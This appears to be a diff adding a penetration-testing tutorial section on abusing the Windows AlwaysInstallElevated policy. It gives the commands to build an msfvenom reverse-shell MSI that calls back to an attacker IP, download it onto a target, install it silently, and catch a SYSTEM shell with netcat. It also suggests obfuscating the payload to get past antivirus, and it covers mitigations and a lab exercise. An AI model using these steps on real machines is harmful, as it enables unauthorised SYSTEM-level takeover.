@@ -2508,3 +2508,292 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o r
 
 
 
+# 📘 **4.4 AlwaysInstallElevated (MSI Abuse) – In Deep**
+
+---
+
+### ✅ **What is AlwaysInstallElevated?**
+
+**AlwaysInstallElevated** is a policy setting in Windows that allows Microsoft Installer packages (`.msi` files) to run with elevated privileges — typically SYSTEM — regardless of the user’s permissions.
+
+If this setting is enabled, attackers can craft malicious MSI files to execute commands with SYSTEM privileges, effectively escalating privileges without exploiting complex vulnerabilities.
+
+---
+
+### ✅ **Why It’s Dangerous**
+
+✔ MSI packages are widely used to install software
+✔ If AlwaysInstallElevated is enabled for both user and machine, attackers can abuse it easily
+✔ No need for kernel exploits or advanced tricks
+✔ Attack works silently if executed correctly
+✔ Often forgotten by system admins after configuring software deployments
+
+---
+
+## ➤ **4.4.1 Where the Setting Is Stored**
+
+The AlwaysInstallElevated setting is controlled by two registry keys:
+
+1. **User Configuration:**
+
+   ```plaintext
+   HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+   ```
+
+2. **Machine Configuration:**
+
+   ```plaintext
+   HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+   ```
+
+If both are set to `1`, any MSI installed by the user runs with SYSTEM privileges.
+
+---
+
+### ✅ How to Check if It’s Enabled
+
+Open PowerShell or CMD and run:
+
+```powershell
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+```powershell
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+Example output:
+
+```
+AlwaysInstallElevated    REG_DWORD    0x1
+```
+
+If both return `0x1`, the system is vulnerable.
+
+---
+
+### ✅ Important Notes
+
+✔ Both user and machine keys must be set to `1`.
+✔ If only one is enabled, the exploit will fail.
+✔ It’s often configured by administrators for deployment purposes without realizing the risk.
+
+---
+
+## ➤ **4.4.2 How It Works – The Attack Flow**
+
+1. Attacker checks registry for AlwaysInstallElevated.
+2. Finds both user and machine keys enabled.
+3. Crafts a malicious MSI installer containing payload.
+4. Runs the MSI → SYSTEM privileges obtained.
+
+---
+
+### ✅ Example MSI Attack Flow
+
+1. Create a reverse shell MSI file.
+2. Run the MSI using `msiexec`.
+3. SYSTEM shell opens.
+
+---
+
+## ➤ **4.4.3 How to Create a Malicious MSI**
+
+You can create an MSI using tools like **msfvenom**, **Installsploit**, or manually with scripts.
+
+### ✅ Using msfvenom
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f msi -o shell.msi
+```
+
+This will generate a malicious MSI that opens a reverse shell when installed.
+
+---
+
+### ✅ Using Installsploit (Automated Tool)
+
+1. Install Python tools like Installsploit:
+
+```bash
+git clone https://github.com/thewhiteh4t/Installsploit
+cd Installsploit
+pip3 install -r requirements.txt
+python3 installsploit.py
+```
+
+2. Create payload, set LHOST and LPORT.
+
+3. Export MSI file.
+
+---
+
+### ✅ Manual MSI Creation
+
+You can craft an MSI using tools like **Orca** or **WiX Toolset**, but msfvenom is faster for practice.
+
+---
+
+## ➤ **4.4.4 How to Run the MSI and Exploit**
+
+### ✅ Step 1 – Verify vulnerability
+
+```powershell
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+Check if both are `0x1`.
+
+### ✅ Step 2 – Transfer the malicious MSI to target
+
+You can use:
+
+✔ PowerShell’s `Invoke-WebRequest`
+✔ Python’s HTTP server
+✔ SMB shares
+
+Example:
+
+```powershell
+Invoke-WebRequest -Uri http://<your-ip>:8000/shell.msi -OutFile shell.msi
+```
+
+### ✅ Step 3 – Run the MSI
+
+```powershell
+msiexec /quiet /qn /i shell.msi
+```
+
+The `/quiet` and `/qn` options suppress GUI popups → stealthy execution.
+
+### ✅ Step 4 – Catch the shell
+
+On your attacking machine, run:
+
+```bash
+nc -lvnp 4444
+```
+
+Once the MSI is installed, SYSTEM shell opens.
+
+---
+
+## ➤ **4.4.5 Example Scenario Walkthrough**
+
+**Target System:**
+
+* Windows 10
+* Both registry keys set to `1`
+* User privileges → `bob`
+* MSI installation allowed
+
+**Steps:**
+
+1. Check AlwaysInstallElevated → vulnerable confirmed.
+2. Create reverse shell MSI using `msfvenom`.
+3. Upload MSI to target using Python server:
+
+```bash
+python3 -m http.server 8000
+```
+
+On target:
+
+```powershell
+wget http://<your-ip>:8000/shell.msi -OutFile shell.msi
+msiexec /quiet /qn /i shell.msi
+```
+
+4. Netcat listener on attacker's machine:
+
+```bash
+nc -lvnp 4444
+```
+
+5. SYSTEM shell opened!
+
+---
+
+## ➤ **4.4.6 How to Verify Successful Exploitation**
+
+Run this command after installing the MSI:
+
+```powershell
+whoami
+```
+
+Expected output:
+
+```
+nt authority\system
+```
+
+You now have full control!
+
+---
+
+## ➤ **4.4.7 Common Mistakes to Avoid**
+
+❌ Only one registry key enabled → exploit won’t work
+❌ Using incorrect architecture MSI → fails or crashes
+❌ Antivirus blocks payload → obfuscate or use manual tools
+❌ Running without checking permissions → no effect
+
+---
+
+## ➤ **4.4.8 How to Mitigate AlwaysInstallElevated Abuse**
+
+✔ Regularly audit registry keys using group policies
+✔ Set `AlwaysInstallElevated` to `0` in both HKCU and HKLM
+✔ Restrict MSI installation rights to trusted admins only
+✔ Monitor installation events in Event Viewer
+✔ Remove unnecessary deployment settings after installation
+
+Commands to disable:
+
+```powershell
+reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f
+reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f
+```
+
+---
+
+## ➤ **4.4.9 Tools That Help Scan and Exploit**
+
+✔ **AccessChk** – Verifies MSI permissions
+✔ **PowerUp** – Scans for AlwaysInstallElevated settings
+✔ **winPEAS** – Automated scan for privilege escalation vectors including MSI abuse
+✔ **msfvenom** – Creates reverse shell MSI
+✔ **Installsploit** – User-friendly MSI exploitation tool
+
+---
+
+## ➤ **4.4.10 Practice Exercises**
+
+1. Set up a Windows VM and enable AlwaysInstallElevated manually:
+
+   ```powershell
+   reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+   reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+   ```
+2. Check the settings with `reg query`.
+3. Create a reverse shell MSI with `msfvenom`.
+4. Upload and install the MSI using PowerShell.
+5. Verify SYSTEM access using `whoami`.
+6. Practice defending by resetting registry settings to `0`.
+
+---
+
+## ➤ **4.4.11 Summary**
+
+✔ AlwaysInstallElevated is a misconfigured policy that allows MSI files to run as SYSTEM.
+✔ Both user and machine registry keys must be set to `1` for the exploit to work.
+✔ Attackers can create malicious MSI files with tools like `msfvenom` and silently install them to gain SYSTEM access.
+✔ It’s a simple but dangerous escalation method — often overlooked.
+✔ Regular audits, disabling the setting, and restricting installation rights can prevent abuse.
+
+---
+
+
+
